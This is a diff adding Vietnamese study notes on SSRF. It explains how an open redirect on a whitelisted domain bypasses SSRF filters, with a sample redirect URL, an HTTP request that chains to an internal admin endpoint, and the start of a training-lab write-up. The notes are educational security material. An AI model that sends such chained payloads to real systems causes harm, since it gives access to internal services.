@@ -202,3 +202,49 @@
 
 > OK, thử double-encode:
 > ![img](../asset/ssrf-4-SSRF-with-whitelist-based-input-filter-4.png) ![img](../asset/ssrf-4-SSRF-with-whitelist-based-input-filter-5.png) ![img](../asset/ssrf-4-SSRF-with-whitelist-based-input-filter-6.png) ![img](../asset/ssrf-4-SSRF-with-whitelist-based-input-filter-7.png)
+
+### Bypassing SSRF filters via open redirection
+
+> Đôi khi bất kì loại phòng thủ nào dựa trên filter bằng cách open redirection vul
+>
+> Ví dụ SSRF bài trước, giả sử URL do người được xác thực nghiêm ngặt chặn hành vi SSRF khai thác có hại
+>
+> Tuy nhiên, ứng dụng có URL được phép chứa lỗ hổng open redirection vul. Với điều kiện API được sử dụng để thực hiện yêu cầu HTTP sau đó hộ trợ redirection, có thể tạo 1 URL để đáp ứng filter dẫn tới yêu cầu redirection tới mục tiêu mong muốn
+
+> Ví dụ:
+>
+> ```
+> /product/nextProduct?currentProductId=6&path=http://evil-user.net
+> ```
+
+> return:
+>
+> ```
+> http://evil-user.net
+> ```
+
+> Có thể tận dụng vul open redirection để bypass qua URL và exploit SSRF như sau:
+>
+> ```
+> POST /product/stock HTTP/1.0
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 118
+>
+> stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+> ```
+
+> Khai thác SSRF hoạt động: ứng dụng sẽ xác thực trước rằng URL `stockAPI` được cấp trên miền được cho phép.
+>
+> Sau đó ứng dụng yêu cầu URL được cấp, URL sẽ được kích hoạt và redirection
+
+#### Lab: SSRF with filter bypass via open redirection vulnerability
+
+> Des: Lab này chứa tính năng kiểm tra data, để solve thì truy cập URL: `http://192.168.0.12:8080/admin` và delete user `carlos`
+>
+> stock checker đã bị hạn chế truy cập local application.
+
+**Giao diện ban đầu**
+![img](../asset/ssrf-5-SSRF-with-filter-bypass-via-open-redirection-vulnerability-0.png)
+
+> Làm theo hướng dẫn :
+> ![img](../asset/ssrf-5-SSRF-with-filter-bypass-via-open-redirection-vulnerability-1.png) ![img](../asset/ssrf-5-SSRF-with-filter-bypass-via-open-redirection-vulnerability-2.png)
